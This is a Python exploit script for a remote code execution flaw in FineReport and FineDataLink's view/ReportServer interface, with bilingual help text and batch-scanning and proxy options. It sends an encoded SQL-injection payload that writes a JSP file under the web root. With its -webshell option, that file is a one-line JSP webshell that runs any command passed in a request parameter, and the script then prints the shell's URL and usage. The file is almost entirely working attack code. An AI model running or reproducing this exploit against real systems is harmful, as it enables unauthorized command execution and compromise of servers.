import time
import argparse
import http.client
import sys
from urllib.parse import urlsplit

parser = argparse.ArgumentParser(
    description="FineReport view ReportServer接口 RCE \n"
                "-影响范围：帆软FineReport V10、V11（最新版）FineDataLink 4.1.10.3 及以下版本\n"
                "-利用路径一般为： http(s)://xxx/webroot/decision | xxx/decision | / \n",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument('-u', '--url', type=str,
                    help='FineReport default URL http(s)://example.com/webroot/decision && http(s)://example.com/decision\n'
                         '设置url')
parser.add_argument('-urls', type=str,
                    help='Path to the input URL file\n'
                         '批量测试，输入url文件路径')
parser.add_argument('-p', '--proxy', type=str,
                    help='The proxy to use for the request, in the format http(s)://user:pass@proxyserver:port\n'
                         '设置代理 http(s)://user:pass@proxyserver:port')
parser.add_argument('-f', '--file', type=str,
                    help='Path to the input webshell file\n'
                         '设置webshell，输入webshell文件路径')
parser.add_argument('-d', action='store_true',
                    help='To facilitate testing, you can directly enter the address. The default path is /webroot/decision\n'
                         '为方便测试，使用此参数后可直接输入地址，默认路径为/webroot/decision')
parser.add_argument('-webshell', action='store_true',
                    help='By default, a harmless file is written. This parameter uploads a sentence webshell\n'
                         '默认写入无害文件，此参数上传一句话webshell')

args = parser.parse_args()
if not args.url and not args.urls:
    print("Error: You must provide either -u/--url or --urls parameter.")
    sys.exit(1)


def request(url, proxy):
    if proxy is None:
        try:
            domain_and_port = urlsplit(url).netloc
            domain = domain_and_port.split(':')[0]
            port = domain_and_port.split(':')[1] if ':' in domain_and_port else None
            if url.startswith('https://'):
                conn = http.client.HTTPSConnection(domain, port, timeout=5)
                conn.request('GET', url)
                result = conn.getresponse()
                conn.close()
            elif url.startswith('http://'):
                conn = http.client.HTTPConnection(domain, port, timeout=5)
                conn.request('GET', url)
                result = conn.getresponse()
                conn.close()
            else:
                result = None
            return result
        except Exception as d:
            print(f"[!] Warning:{domain_and_port} {d}")
            return None
    elif proxy:
        try:
            domain_and_port = urlsplit(proxy).netloc
            domain = domain_and_port.split(':')[0]
            port = domain_and_port.split(':')[1] if ':' in domain_and_port else None
            conn = http.client.HTTPConnection(domain, port, timeout=5)
            conn.request('GET', url)
            result = conn.getresponse()
            conn.close()
            return result
        except Exception as d:
            print(f"[!] Warning: proxy configuration error:{d}")
            sys.exit(1)


def url_encode(input_str):
    """对每个字符进行 URL 编码"""
    encoded_string = ''.join('%' + format(ord(char), 'x') for char in input_str)
    return encoded_string


runtime = str(int(time.time()))
webshell = "neko"
if args.webshell:
    webshell = "<% if(\"neko\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"c\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>"
# 自定义webshell
if args.file:
    with open(args.file, 'r') as f:
        webshell = f.read()


def full_url(url):
    exp_url = (f"{url}/view/ReportServer?test=s&n=${{__fr_locale__=sql('FRDemo',DECODE("
               f"'%ef%bb%bf%61%74%74%61%63%68%0C%64%61%74%61%62%61%73%65%20%27%2e%2e%2f%77%65%62%61%70%70%73%2f%77%65%62"
               f"%72%6f%6f%74%2f%68%65%6C%70%2F%6e%65%6b%6f{url_encode(runtime)}%2E%6A%73%70%27%20%61%73%20%27%6e%65%6b%6f"
               f"{url_encode(runtime)}%27%3B'),1,1)}}${{__fr_locale__=sql('FRDemo',DECODE("
               f"'%ef%bb%bf%63%72%65%61%74%65%0C%74%61%62%6C%65%20%6e%65%6b%6f"
               f"{url_encode(runtime)}%2E%74%74%28%64%61%74%61%7A%20%74%65%78%74%29%3B'),1,1)}}${{__fr_locale__=sql("
               f"'FRDemo',DECODE('%ef%bb%bf%49%4E%53%45%52%54%0C%69%6E%74%6F%20%6e%65%6b%6f"
               f"{url_encode(runtime)}%2E%74%74%28%64%61%74%61%7A%29%20%56%41%4C%55%45%53%20%28%27{url_encode(webshell)}%27%29%3B'),1,1)}}")
    return exp_url


def exp(url):
    # 攻击
    runexp = request(full_url(url), args.proxy)
    if runexp is not None:
        if runexp.status != 302:
            print(f"[-] {url}漏洞大概率不存在！")
        # 验证是否成功
        parts = url.split('/')
        if 'decision' in parts:
            parts.remove('decision')
        webshell_url = '/'.join(parts) + f"/help/neko{runtime}.jsp"
        response = request(webshell_url, args.proxy)
        if response is not None:
            if response.status == 200:
                data = response.read()
                if data:
                    print(
                        f"[+] webshell地址为：{webshell_url}/help/neko{runtime}.jsp\n如使用默认webshell 则利用方式为：{webshell_url}/help/neko{runtime}.jsp?pwd=neko&c=whoami")
                else:
                    print(
                        f"[!] {url}利用失败。但webshell地址：{webshell_url}/help/neko{runtime}.jsp存在。")
            else:
                print(
                    f"[-] {url}利用失败。可能路径发生错误，-h查看说明。")
    else:
        if not url.startswith('https://') | url.startswith('http://'):
            print(f"[!] {url} url warning 地址输入方式错误，应加上http(s)://")


if args.url:
    if args.d:
        exp(args.url.rstrip('/') + '/webroot/decision')
    else:
        exp(args.url.rstrip('/'))

if args.urls:
    try:
        with open(args.urls, 'r') as file:
            urls = file.readlines()
            urls = [url.strip().rstrip('/') for url in urls]
            if args.d:
                urls = [url + '/webroot/decision' for url in urls]
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

    for url in urls:
        exp(url)
